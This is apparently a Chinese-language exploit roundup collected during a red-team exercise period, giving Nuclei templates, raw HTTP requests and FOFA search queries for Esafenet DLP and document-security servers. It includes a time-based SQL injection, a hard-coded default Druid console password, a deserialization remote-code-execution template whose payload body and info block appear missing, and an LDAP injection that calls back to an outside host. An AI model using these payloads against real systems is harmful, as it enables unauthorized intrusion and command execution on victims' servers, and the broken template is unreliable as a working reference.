# 【漏洞复现|含POC】HW期间某某通漏洞整理

# 亿赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL 注入

## YAML-POC

```yaml
id: yisaitong-DLP-NetSecConfigAjax-sqli

info:
  name: 亿赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL 注入
  author: xx
  severity: high
  description: 亿赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL 注入
  metadata:
    fofa-query: app="亿赛通-DLP"
  tags: yisaitong,sqli

http:
- raw:
  - |-
    @timeout: 30s
    POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY'0:0:3'--

  matchers-condition: and
  matchers:
        - type: dsl
          dsl:
            - 'duration>=3 && duration<8'
            - 'status_code_1 == 200'
          condition: and

```

​![image](assets/image-20240904220222-xjatpi6.png)​

## 漏洞复现

```yaml
POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 97

command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY'0:0:3'--
```

# 亿赛通电子文档安全管理系统submitLogin 默认口令

## YAML-POC

```yaml
id: yisaitong-CDG-druid-submitLogin-defaultpasswd

info:
  name: 亿赛通电子文档安全管理系统submitLogin 默认口令
  author: xx
  severity: high
  description: 亿赛通电子文档安全管理系统submitLogin 默认口令
  metadata:
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: yisaitong,password

http:
- raw:
  - |
    @timeout: 30s
    POST /CDGServer3/druid/submitLogin HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Connection: close

    loginUsername=druid&loginPassword=EstNet.Druid

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'status_code_1 == 200'
      condition: and

```

​![image](assets/image-20240904223115-fwvy51m.png)​

## 漏洞复现

```yaml
POST /CDGServer3/druid/submitLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: close

loginUsername=druid&loginPassword=EstNet.Druid
```

```yaml
id: yisaitong-CDG-DecryptionApp-deserialization-rce

  tags: yisaitong,rce

http:
- raw:
  - |-
    @timeout: 30s
    POST /CDGServer3/DecryptionApp?command=GETSYSTEMINFO HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
    Accept-Encoding: gzip, deflate, br
    Connection: close
    Content-Type: text/xml
    cmd: whoami

    

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'status_code_1 == 200'
```

# 亿赛通电子文档安全管理系统 logincontroller 远程代码执行漏洞

## YAML-POC

```yaml
id: yisaitong-CDG-logincontroller-rce

info:
  name: 亿赛通电子文档安全管理系统 logincontroller 远程代码执行漏洞
  author: xx
  severity: high
  description: 亿赛通电子文档安全管理系统 logincontroller 远程代码执行漏洞
  metadata:
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: yisaitong,rce

http:
- raw:
  - |
    @timeout: 30s
    POST /CDGServer3/logincontroller HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Connection: close

    fromurl=/LdapAjax&token=1&command=testConnection&hosts=ldap://{{interactsh-url}},OU=exp,DC=exp,DC=com&users=account&dns=CN=account,OU=exp,DC=exp,DC=com&dns2=OU=exp,DC=exp,DC=com&type=0&pwds=123456

  max-redirects: 3
  matchers-condition: and
  matchers:
      - type: word
        words:
          - "dns"
        part: interactsh_protocol

```

## 漏洞复现

```yaml
POST /CDGServer3/logincontroller HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Connection: close

fromurl=/LdapAjax&token=1&command=testConnection&hosts=ldap://192.168.10.1:1379/CN=account,OU=exp,DC=exp,DC=com&users=account&dns=CN=account,OU=exp,DC=exp,DC=com&dns2=OU=exp,DC=exp,DC=com&type=0&pwds=123456
```
